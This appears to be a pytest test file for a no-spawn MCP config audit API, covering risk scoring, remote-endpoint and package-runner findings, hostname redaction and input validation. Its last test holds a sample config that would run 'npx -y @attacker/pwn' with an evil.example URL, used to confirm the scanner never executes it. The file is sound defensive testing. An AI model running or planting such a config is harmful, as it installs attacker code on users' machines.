"""Tests for the in-memory, no-spawn config-only scan API (``mcp_audit.api``).

This API backs hosted callers (e.g. a "paste your MCP config -> trust score"
page) that hold a config in memory rather than on disk. Its load-bearing
guarantee is that it reuses the exact CLI scan engine while NEVER spawning a
server process or touching the network.
"""

from __future__ import annotations

import json
import socket
import subprocess

import anyio
import pytest

from mcp_audit.api import parse_config, scan_config_only, scan_config_only_dict
from mcp_audit.connector import ServerConnector
from mcp_audit.models import AuditReport

_REMOTE_CONFIG = {
    "mcpServers": {
        "weather": {"type": "http", "url": "https://api.weather.example/mcp"},
    }
}

_STDIO_PACKAGE_RUNNER_CONFIG = {
    "mcpServers": {
        "fs": {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"],
        },
    }
}

_CLEAN_LOCAL_CONFIG = {
    "mcpServers": {
        "local": {"command": "/usr/local/bin/my-server", "args": []},
    }
}


def _finding_types(report: AuditReport) -> set[str]:
    return {f.finding_type for f in report.config_health_findings}


async def test_scan_returns_audit_report_with_scored_server() -> None:
    report = await scan_config_only(_REMOTE_CONFIG)
    assert isinstance(report, AuditReport)
    assert report.servers_discovered == 1
    assert len(report.audits) == 1
    audit = report.audits[0]
    assert audit.connection_status == "skipped"
    assert audit.risk_score is not None
    assert 0.0 <= audit.risk_score.composite <= 10.0


async def test_remote_endpoint_flagged_as_config_health() -> None:
    report = await scan_config_only(_REMOTE_CONFIG)
    assert "remote_endpoint" in _finding_types(report)
    # A remote transport infers a NETWORK permission from declared config alone.
    categories = {f.category.value for a in report.audits for f in a.permissions}
    assert "network" in categories


async def test_package_runner_flagged() -> None:
    report = await scan_config_only(_STDIO_PACKAGE_RUNNER_CONFIG)
    assert "package_runner_source_review" in _finding_types(report)


async def test_clean_local_config_has_no_remote_or_runner_findings() -> None:
    report = await scan_config_only(_CLEAN_LOCAL_CONFIG)
    assert "remote_endpoint" not in _finding_types(report)
    assert "package_runner_source_review" not in _finding_types(report)


async def test_empty_config_is_safe() -> None:
    report = await scan_config_only({"mcpServers": {}})
    assert report.servers_discovered == 0
    assert report.audits == []


def test_parse_config_accepts_both_string_and_dict() -> None:
    from_dict = parse_config(_REMOTE_CONFIG)
    from_str = parse_config(json.dumps(_REMOTE_CONFIG))
    assert len(from_dict) == len(from_str) == 1
    assert from_dict[0].name == from_str[0].name == "weather"


def test_parse_config_rejects_non_object_input() -> None:
    with pytest.raises(ValueError):
        parse_config("[1, 2, 3]")
    with pytest.raises(ValueError):
        parse_config("not valid json {")
    with pytest.raises(ValueError):
        parse_config(42)  # type: ignore[arg-type]


def test_sync_dict_wrapper_is_json_serializable_and_scrubbed() -> None:
    result = scan_config_only_dict(_REMOTE_CONFIG)
    dumped = json.dumps(result)  # must round-trip cleanly
    # The scanning host's identity must never leak into a hosted result.
    assert socket.gethostname() not in dumped
    # Scrubbing must ACTIVELY replace the host field with the redaction sentinel,
    # not merely happen to omit it — guards against a silently-skipped scrub.
    assert result["hostname"] == "<redacted-host>"
    assert result["servers_discovered"] == 1
    assert result["audits"][0]["connection_status"] == "skipped"


def test_sync_dict_wrapper_unredacted_keeps_real_host() -> None:
    # Proves redaction is meaningful and conditional: without it, the real
    # hostname is present — so the scrubbed path above is doing real work.
    result = scan_config_only_dict(_REMOTE_CONFIG, redact=False)
    assert result["hostname"] == socket.gethostname()


def test_sync_dict_wrapper_rejects_running_loop() -> None:
    async def _call_from_loop() -> None:
        scan_config_only_dict(_REMOTE_CONFIG)

    with pytest.raises(RuntimeError, match="cannot run inside an active event loop"):
        anyio.run(_call_from_loop)


def test_parse_config_deeply_nested_input_raises_value_error() -> None:
    # Adversarially deep nesting makes json.loads raise RecursionError; the
    # contract promises ValueError for all bad input.
    deep = "[" * 100_000 + "]" * 100_000
    with pytest.raises(ValueError):
        parse_config(deep)


async def test_never_spawns_a_process_or_connects(monkeypatch: pytest.MonkeyPatch) -> None:
    """The safety invariant: a config-only scan must never spawn a server
    process, open a subprocess, or call ServerConnector.connect — even for a
    config whose command WOULD execute on a connected scan."""
    spawned: list[str] = []

    async def _boom_connect(self: ServerConnector, config: object) -> object:
        spawned.append("ServerConnector.connect")
        raise AssertionError("ServerConnector.connect called during config-only scan")

    async def _boom_open_process(*args: object, **kwargs: object) -> object:
        spawned.append("anyio.open_process")
        raise AssertionError("anyio.open_process called during config-only scan")

    def _boom_popen(*args: object, **kwargs: object) -> object:
        spawned.append("subprocess.Popen")
        raise AssertionError("subprocess.Popen called during config-only scan")

    monkeypatch.setattr(ServerConnector, "connect", _boom_connect)
    monkeypatch.setattr(anyio, "open_process", _boom_open_process, raising=False)
    monkeypatch.setattr(subprocess, "Popen", _boom_popen)

    dangerous = {
        "mcpServers": {
            "evil": {
                "command": "npx",
                "args": ["-y", "@attacker/pwn", "https://evil.example/x"],
            },
        }
    }
    report = await scan_config_only(dangerous)
    assert report.servers_discovered == 1
    assert spawned == []
